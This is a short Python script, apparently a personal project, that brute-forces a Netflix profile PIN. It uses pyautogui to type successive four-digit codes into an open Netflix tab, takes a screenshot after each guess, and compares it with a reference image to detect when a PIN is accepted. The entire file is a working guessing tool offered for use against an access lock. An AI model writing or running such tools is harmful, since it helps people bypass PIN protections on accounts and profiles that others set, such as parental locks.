import pyautogui
import time
import pyscreenshot as ImageGrab
import PythonMagick
import os

TIME_COUNT = 5
BEGIN = 1300
END = 1310

def Init():
	print("Brute Force Netflix PIN - Cao Hung Phu")
	print("Click Netflix tab!!!!")
	for i in range(TIME_COUNT):
		print(TIME_COUNT - i, "seconds left")
		time.sleep(1)
	os.system("clear")
	print("STARTED!!")

def PrintPIN(pin_code):
	print("Brute Force Netflix PIN - Cao Hung Phu")
	print("[=> YOUR PIN CODE: ", pin_code)
	print("Facebook: caohungphuvn")
	print("Github: caohungphu")
	print("Site: caohungphu.github.io")

def TakeScreenShot():
	im = ImageGrab.grab(bbox=(5, 120, 670, 520))
	im.save('temp.png')

def Compare2Images():
	TakeScreenShot()
	img = PythonMagick.Image("main.png")
	img2 = PythonMagick.Image("temp.png")
	os.remove('temp.png')
	if (img.signature() == img2.signature()):
		return True
	return False

def RunForLoop(begin_i, end_i):
	for i in range(begin_i, end_i):
		pyautogui.press(str(int(i / 1000)))
		pyautogui.press(str(int(i % 1000 / 100)))
		pyautogui.press(str(int(i % 100 / 10)))
		pyautogui.press(str(int(i % 10)))
		time.sleep(1)
		if (Compare2Images() == False):
			print("PIN:", i, " => MATCH!!\n")
			PrintPIN(i)
			exit()
		else:
			print("PIN:", i, " => WRONG!!")

def main():
	Init()
	RunForLoop(BEGIN, END)

if __name__ == '__main__':
    main()